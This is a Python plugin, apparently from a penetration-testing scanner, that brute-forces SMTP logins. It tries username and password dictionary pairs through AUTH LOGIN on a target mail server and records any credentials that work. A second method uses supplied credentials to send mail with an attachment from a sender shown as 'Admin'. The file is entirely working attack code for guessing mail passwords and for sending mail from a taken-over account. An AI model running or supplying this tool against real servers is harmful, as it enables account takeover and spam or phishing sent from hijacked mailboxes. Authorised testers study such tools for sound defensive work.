#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import socket,base64
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.SMTP
        self.name = 'smtp burst'
        self.keyword = ['smtp', 'burst']
        self.info = 'smtp burst'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)


    def prove(self):
        if _socket_connect(self.target_host, self.target_port):
            flag = 3
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(
                'dict/smtp_usernames.txt')
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(
                'dict/smtp_passwords.txt')
            for linef1 in usernamedic:
                username = linef1.strip('\r').strip('\n')
                try:
                    username1 = username.replace("%host%", '.'.join(self.target_host.split('.')[1:]))
                except:
                    username1 = username
                for linef2 in passworddic:
                    password = linef2.replace("%user%", username).strip('\r').strip('\n').replace("@%host%", '')
                    try:
                        socket.setdefaulttimeout(5)
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((self.target_host, self.target_port))
                        banner = str(s.recv(1024))
                        emailaddress = '.'.join(self.target_host.split('.')[1:])
                        # print(username1,password)
                        if "220" in banner:
                            s.send(bytes('HELO mail.' + emailaddress + ' \r\n', 'utf-8'))
                            helo = str(s.recv(1024))
                            # print(helo)
                            if "250" in helo:
                                s.send(bytes('auth login \r\n', 'utf-8'))
                                authanswer = str(s.recv(1024))
                                # print(authanswer)
                                if "334" in authanswer:
                                    s.send(base64.b64encode(bytes(username1, encoding='utf-8')) + b'\r\n')
                                    useranswer = str(s.recv(1024))
                                    # print(useranswer)
                                    if "334" in useranswer:
                                        s.send(base64.b64encode(bytes(password, encoding='utf-8')) + b'\r\n')
                                        # print(username + "/" + password)
                                        passanswer = str(s.recv(1024))
                                        # print(passanswer)
                                        if "235" in passanswer:
                                            self.flag = 1
                                            self.req.append({"username": username, "password": password})
                                            self.res.append({"info": username + "/" + password, "key": 'smtp'})
                                            return

                        else:
                            return
                    except Exception as e:
                        if "timed out" in str(e):
                            if flag == 0 :
                                return
                            flag -= 1

    def exec(self):
        if _socket_connect(self.target_host, self.target_port):
            import os
            import time
            import smtplib
            from email.mime.multipart import MIMEMultipart
            from email.mime.text import MIMEText
            from email.mime.base import MIMEBase
            from email.header import Header
            mail_user = self.parameter['u']
            mail_pass = self.parameter['p']
            sender = self.parameter['s']
            receivers = self.parameter['r'].split(',')
            filename = self.parameter['f']
            content = self.parameter['c']
            mail_host = self.target_host
            mail_port = self.target_port
            content = '''
            Helo,
                %s 
                                                                                        —— by Tester
            ''' % content
            message = MIMEMultipart()
            message['From'] = "Admin<%s>" % sender
            message['To'] = ','.join(receivers)
            message['Subject'] = Header(filename, 'utf-8')
            message.attach(MIMEText(content, 'plain', 'utf-8'))

            with open(os.path.join(filename), 'rb') as f:
                att = MIMEText(f.read(), 'base64', 'utf-8')
                att["Content-Type"] = 'application/octet-stream'
                att.add_header("Content-Disposition", "attachment", filename=("utf-8", "", 'test.txt'))
                message.attach(att)

            n = 3
            while n > 0:
                try:
                    socket.setdefaulttimeout(5)
                    if self.target_port == 465:
                        smtpObj = smtplib.SMTP_SSL()
                    else:
                        smtpObj = smtplib.SMTP()
                    smtpObj.connect(mail_host, mail_port)
                    smtpObj.login(mail_user, mail_pass)
                    smtpObj.sendmail(sender, receivers, message.as_string())
                    print("SMTP send success.")
                    self.flag = 1
                    self.res.append({"info": mail_user + "/" + mail_pass, "key": 'smtp'})
                    break
                except smtplib.SMTPException as e:
                    print("Error for SMTP: %s" % (str(e)))
                    pass
                except socket.timeout as e:
                    print("Timeout for SMTP.")
                    pass

                time.sleep(10)
                n -= 1


def _socket_connect(ip, port,msg = "test"):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:      
        s.connect((ip, port))
        s.sendall(bytes(msg, 'utf-8'))
        s.close()
        return True
    except:
        return False
